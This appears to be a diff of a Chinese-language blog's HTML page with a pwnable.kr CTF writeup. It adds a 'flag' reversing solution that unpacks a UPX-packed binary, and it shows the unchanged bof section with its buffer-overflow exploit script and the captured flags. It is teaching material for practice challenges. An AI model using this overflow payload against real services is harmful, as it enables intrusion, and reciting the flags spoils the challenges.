@@ -104,7 +104,7 @@
 <meta property="og:site_name" content="Cyris | 绿生">
 <meta property="og:description" content="开始学习 pwn 。 网址：http://pwnable.kr">
 <meta property="og:image" content="https://icyris.github.io/2018/03/12/pwnable-kr/bof-1.png">
-<meta property="og:updated_time" content="2018-03-15T13:10:08.000Z">
+<meta property="og:updated_time" content="2018-03-18T15:47:40.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.kr writeup">
 <meta name="twitter:description" content="开始学习 pwn 。 网址：http://pwnable.kr">
@@ -497,6 +497,19 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_socket = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</div><div class="line">pwn_socket.sendline(<span class="string">'A'</span> * <span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span>)</div><div class="line"></div><div class="line">pwn_socket.interactive()</div></pre></td></tr></table></figure>
 <p><code>daddy, I just pwned a buFFer :)</code></p>
 <hr>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><blockquote>
+<p>Papa brought me a packed present! let’s open it.</p>
+<p>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="external">http://pwnable.kr/bin/flag</a></p>
+<p>This is reversing task. all you need is binary</p>
+</blockquote>
+<p>ida 载入后发现字符串：”This file is packed with the UPX”，那就用 upx 去解密 elf。</p>
+<p>首先安装 upx : </p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-<span class="keyword">get</span> install upx-ucl</div></pre></td></tr></table></figure>
+<p>之后执行命令解压 : </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">upx <span class="_">-d</span> flag</div></pre></td></tr></table></figure>
+<p>重新用 ida 载入后找到 flag ：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.<span class="string">rodata:</span><span class="number">0000000000496628</span> aUpxSoundsLikeA db <span class="string">'UPX...? sounds like a delivery service :)'</span>,<span class="number">0</span></div><div class="line">.<span class="string">rodata:</span><span class="number">0000000000496628</span>                                         ; DATA <span class="string">XREF:</span> .<span class="string">data:</span>flag↓o</div></pre></td></tr></table></figure>
+<p><code>UPX...? sounds like a delivery service :)</code></p>
 
       
     </div>
@@ -647,7 +660,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -658,7 +671,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">18</span>
+                <span class="site-state-item-count">13</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -724,7 +737,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler’s-Bottle"><span class="nav-text">[Toddler’s Bottle]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-text">bof</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler’s-Bottle"><span class="nav-text">[Toddler’s Bottle]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-text">bof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-text">flag</span></a></li></ol></li></ol></div>
             
 
           </div>
